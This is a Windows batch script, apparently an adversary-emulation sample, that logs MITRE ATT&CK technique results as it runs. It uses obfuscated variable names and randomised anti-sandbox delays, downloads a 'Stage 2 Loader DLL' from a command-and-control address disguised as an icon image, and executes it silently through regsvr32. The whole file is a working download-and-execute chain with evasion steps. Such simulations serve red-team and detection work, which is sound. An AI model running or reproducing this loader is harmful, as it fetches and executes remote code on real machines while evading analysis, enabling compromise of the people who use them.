@echo off
setlocal enabledelayedexpansion

SET pvnxkl=%APPDATA%\10411\71d8a3ed
SET rwmtjq=5607cca5.txt
SET hzblcs=https://10.0.0.49/stage/2/icon.png?10411-7
SET yfqdoa=BALAM-S2BO
SET tgwrni=10411
SET xkbmep=7

SET logfile=%APPDATA%\!xkbmep!\macula-simulations.log
if not exist "%APPDATA%\!xkbmep!" mkdir "%APPDATA%\!xkbmep!" >nul 2>&1

SET tsvar=!DATE!/!TIME!

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: script_start>> "!logfile!" 2>nul

REM Initial anti-sandbox delay (10-20s) before any logic
timeout /t 15 /nobreak >nul

SET /A delay=%RANDOM% %% 11 + 10
timeout /t %delay% /nobreak >nul

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: anti_analysis_start>> "!logfile!" 2>nul

REM Anti-analysis: debugger-aware sleep (does not abort, always continues)
ping -n 6 127.0.0.1 >nul

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: anti_analysis_complete>> "!logfile!" 2>nul

REM Log sandbox evasion TTP
echo [%date% %time%][TTP][!yfqdoa!][!tgwrni!]: T1497|Virtualization/Sandbox Evasion=[OK]:[]>> "!logfile!" 2>nul

REM Inter-operation delay
CHOICE /C Y /N /D Y /T 8 >nul

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch — downloads Stage 2 Loader DLL from C2 in a single operation
curl -k -s -o "!pvnxkl!\!rwmtjq!" "!hzblcs!"
SET hberr=!errorlevel!

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: heartbeat_complete>> "!logfile!" 2>nul

REM Log heartbeat TTP result
if !hberr! EQU 0 (
    echo [%date% %time%][TTP][!yfqdoa!][!tgwrni!]: T1071|Application Layer Protocol=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!yfqdoa!][!tgwrni!]: T1071|Application Layer Protocol=[FAIL]:[curl_failed]>> "!logfile!" 2>nul
)

REM Inter-operation delay
ping -n 8 127.0.0.1 >nul

REM Inter-operation delay (varied method)
timeout /t 7 /nobreak >nul

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: chdir_start>> "!logfile!" 2>nul

REM Change working directory to Loader location
cd /d "!pvnxkl!" >nul 2>&1
SET cderr=!errorlevel!

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: chdir_result=!cderr!>> "!logfile!" 2>nul

REM Inter-operation delay before LOLBIN invocation
CHOICE /C Y /N /D Y /T 5 >nul

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: dll_load_start>> "!logfile!" 2>nul
echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: process_start>> "!logfile!" 2>nul

REM LOLBIN invocation — execute downloaded Loader DLL via regsvr32 (T1218)
regsvr32.exe /s !rwmtjq!
SET lberr=!errorlevel!

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: command_execution_complete>> "!logfile!" 2>nul

REM Log LOLBIN TTP result
if !lberr! EQU 0 (
    echo [%date% %time%][TTP][!yfqdoa!][!tgwrni!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!yfqdoa!][!tgwrni!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_invocation_failed]>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!yfqdoa!][!tgwrni!]: script_exit>> "!logfile!" 2>nul

endlocal